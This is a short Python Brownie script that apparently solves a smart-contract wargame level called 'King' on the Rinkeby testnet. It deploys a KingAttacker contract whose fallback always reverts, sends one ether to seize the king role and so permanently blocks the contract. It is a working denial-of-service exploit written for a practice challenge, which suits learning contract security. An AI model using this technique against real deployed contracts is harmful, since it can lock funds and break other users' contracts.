from brownie import accounts, King, KingAttacker
from web3 import Web3

eth_amount = Web3.toWei("1", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xdD2FC604EfCA0b7EC611f90c00F0134CC1915C4d"
king = King.at(instance_address)

# -------------------------------------------------------------
# to pass this level we need to break the contract
#
# we do that by setting our hacker contract as king
# hacker will have a fallback function that will always revert
# -------------------------------------------------------------


def level_completed():
    return king._king() == hacker.address


def exploit():
    # deploy hacker contract
    global hacker
    hacker = KingAttacker.deploy(instance_address, {"from": account})
    print(f"The address of this hacker contract is: {hacker.address}")

    # view who is the current king and current prize
    print(f"This is the current king: {king._king()}")
    print(f"This is the current prize: {king.prize()}")

    # call becomeKing function in hacker contract
    tx = hacker.becomeKing({"from": account, "value": eth_amount})
    tx.wait(1)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
